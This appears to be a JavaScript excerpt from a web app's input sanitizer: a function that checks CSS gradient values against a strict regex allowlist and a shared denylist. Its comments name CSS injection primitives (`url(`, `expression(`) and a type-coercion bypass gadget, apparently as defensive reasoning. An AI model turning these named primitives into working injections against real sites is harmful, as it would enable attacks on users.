// cssColor has no gradient-function alternative (a gradient is legitimately its
// own grammar, not a color token), so slide.bgGradient needs a sibling encoder
// rather than a weakened cssColor. Structural allowlist: only the three gradient
// function names, only the charset a color-stop list can legitimately contain
// (hex/rgb/hsl color tokens, numbers, %, deg, commas, the "to"/"at"/side/corner/
// shape keywords, nested parens for rgba(...) stops). That charset alone still
// contains every letter, so `url(` or `expression(` would satisfy it — the
// canonical STYLE_VALUE_REJECT denylist (shared with scrubCssFields) is the
// actual gate against those; the structural allowlist's job is only to reject
// stray punctuation (quotes, semicolons, braces, backslashes) a fetching/
// breakout primitive would need but a real gradient never does. (v13.26)
const CSS_GRADIENT_OK = /^(?:repeating-)?(?:linear|radial|conic)-gradient\([a-zA-Z0-9#.,%\s()-]*\)$/;
// Fail-closed on TYPE first — see cssColor above for why: a coercing `String(g)`
// would let a single-element array or {toString} gadget satisfy the structural
// allowlist exactly like a real string does. (v13.26)
function cssGradient(g) {
  if (typeof g !== "string") return "";
  const v = g.trim();
  if (!v || v.length > 500) return "";
  return (CSS_GRADIENT_OK.test(v) && !STYLE_VALUE_REJECT.test(v)) ? v : "";
}

